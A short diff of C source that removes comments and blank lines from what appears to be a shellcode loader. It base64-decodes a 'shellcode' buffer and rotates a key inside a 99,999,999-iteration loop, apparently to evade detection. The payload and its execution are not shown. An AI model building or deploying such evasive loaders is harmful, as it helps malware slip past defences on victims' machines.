@@ -55,15 +55,12 @@ void excess_code() {
 
 void adjust_first_to_last(char *array) {
     int length = strlen(array);
-    if (length > 1) { // 确保数组长度大于1
-        char first_char = array[0]; // 记录第一位字符
-        
-        // 将第一位之后的字符向前移动
+    if (length > 1) {
+        char first_char = array[0];
         for (int i = 1; i < length; i++) {
             array[i - 1] = array[i];
         }
-        
-        array[length - 1] = first_char; // 将第一位字符放到最后
+        array[length - 1] = first_char;
     }
 }
 
@@ -75,7 +72,6 @@ int main() {
     int shellcode_len = sizeof(shellcode) / sizeof(shellcode[0]) - 1;
     base64_decode(shellcode, &decoded, shellcode_len);
     for(int i = shellcode_len/4*3-1; i>=0 ; i--){
-        
         if (decoded[i] != '\x00') {
             for(int i = 0; i<99999999; i++){
                 adjust_first_to_last(key);
